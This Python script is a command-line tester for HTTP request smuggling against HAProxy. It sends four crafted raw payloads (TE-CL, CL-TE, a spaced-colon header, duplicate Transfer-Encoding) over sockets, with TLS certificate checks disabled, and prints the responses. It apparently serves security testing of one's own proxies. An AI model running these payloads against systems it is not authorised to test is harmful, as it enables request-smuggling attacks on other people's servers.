import socket
import ssl
import argparse
import logging
from typing import List, Tuple


def title() -> None:
    print(r'''MSR
    ''')


def create_insecure_ssl_context() -> ssl.SSLContext:
    """Create an SSL context that ignores certificate errors and hostname validation."""
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    return context


def recv_all(sock: socket.socket, timeout: float) -> bytes:
    """Receive all available data until timeout or connection close."""
    sock.settimeout(timeout)
    chunks: List[bytes] = []
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)
    except Exception:
        # Timeout or connection closed; best-effort read
        pass
    return b"".join(chunks)


def send_raw_payload(host: str, port: int, use_https: bool, payload: str, timeout: float) -> Tuple[bool, str]:
    """Send a raw HTTP payload and return (success, response_text or error)."""
    sock: socket.socket
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if use_https:
            context = create_insecure_ssl_context()
            sock = context.wrap_socket(sock, server_hostname=host)

        sock.sendall(payload.encode("utf-8", errors="ignore"))
        response_bytes = recv_all(sock, timeout)
        sock.close()
        response_text = response_bytes.decode(errors="ignore")
        return True, response_text
    except Exception as exc:
        return False, f"[-] Error: {exc}"


def build_smuggling_payloads(host: str, path: str) -> List[Tuple[str, str]]:
    """Return a list of (name, payload) tuples covering multiple smuggling variants."""
    user_agent = "MSR-HAProxy-Smuggling-Tester/1.0"

    te_cl_basic = (
        "POST {path} HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "User-Agent: {ua}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: close\r\n"
        "\r\n"
        "0\r\n\r\n"
        "GARB"
    ).format(host=host, path=path, ua=user_agent)

    te_cl_space_colon = (
        "POST {path} HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "User-Agent: {ua}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding : chunked\r\n"
        "Connection: close\r\n"
        "\r\n"
        "0\r\n\r\n"
        "GARB"
    ).format(host=host, path=path, ua=user_agent)

    cl_te_basic = (
        "POST {path} HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "User-Agent: {ua}\r\n"
        "Content-Length: 10\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: close\r\n"
        "\r\n"
        "5\r\nHELLO\r\n0\r\n\r\n"
    ).format(host=host, path=path, ua=user_agent)

    dup_te_headers = (
        "POST {path} HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "User-Agent: {ua}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: cow\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: close\r\n"
        "\r\n"
        "0\r\n\r\n"
        "GARB"
    ).format(host=host, path=path, ua=user_agent)

    return [
        ("TE-CL basic", te_cl_basic),
        ("TE-CL space-colon", te_cl_space_colon),
        ("CL-TE basic", cl_te_basic),
        ("Duplicate TE headers", dup_te_headers),
    ]


def normalize_path(path: str) -> str:
    if not path:
        return "/"
    if not path.startswith("/"):
        return "/" + path
    return path


def run_tests(host: str, port: int, use_https: bool, path: str, timeout: float, verbose: bool) -> None:
    scheme = "HTTPS" if use_https else "HTTP"
    logging.info(f"\n=== Testing {scheme} {host}:{port}{path} ===")

    for name, payload in build_smuggling_payloads(host, path):
        logging.info(f"\n[+] Payload: {name}")
        ok, response_text = send_raw_payload(host, port, use_https, payload, timeout)
        if not ok:
            logging.error(response_text)
            continue

        if verbose:
            print(response_text)
        else:
            first_line = response_text.splitlines()[0] if response_text.splitlines() else "(no response)"
            logging.info(f"Response: {first_line}")


def main() -> None:
    parser = argparse.ArgumentParser(description="HAProxy 2.0+ Request Smuggling Tester (HTTP/HTTPS)")
    parser.add_argument("host", help="Target host (IP or domain)")
    parser.add_argument("-p", "--port", type=int, help="Port for HTTP or single-mode (default: 80 for HTTP, 443 for HTTPS)")
    parser.add_argument("--https", action="store_true", help="Test ONLY HTTPS (default: HTTP unless --both)")
    parser.add_argument("--both", action="store_true", help="Test both HTTP and HTTPS")
    parser.add_argument("--https-port", type=int, help="Port to use for HTTPS when testing both (default: 443)")
    parser.add_argument("--path", default="/", help="Request path (default: /)")
    parser.add_argument("--timeout", type=float, default=10.0, help="Socket timeout in seconds (default: 10)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Print full responses")

    args = parser.parse_args()

    path = normalize_path(args.path)

    title()
    logging.basicConfig(level=logging.DEBUG if args.verbose else logging.INFO, format='%(message)s')

    if args.both:
        http_port = args.port if args.port else 80
        https_port = args.https_port if args.https_port else 443
        logging.info(f"[+] Target (HTTP): {args.host}:{http_port}{path}")
        run_tests(args.host, http_port, False, path, args.timeout, args.verbose)
        logging.info(f"[+] Target (HTTPS): {args.host}:{https_port}{path}")
        run_tests(args.host, https_port, True, path, args.timeout, args.verbose)
    else:
        use_https = bool(args.https)
        port = args.port if args.port else (443 if use_https else 80)
        logging.info(f"[+] Target: {args.host}:{port}{path} {'(HTTPS)' if use_https else '(HTTP)'}")
        run_tests(args.host, port, use_https, path, args.timeout, args.verbose)


if __name__ == "__main__":
    main()
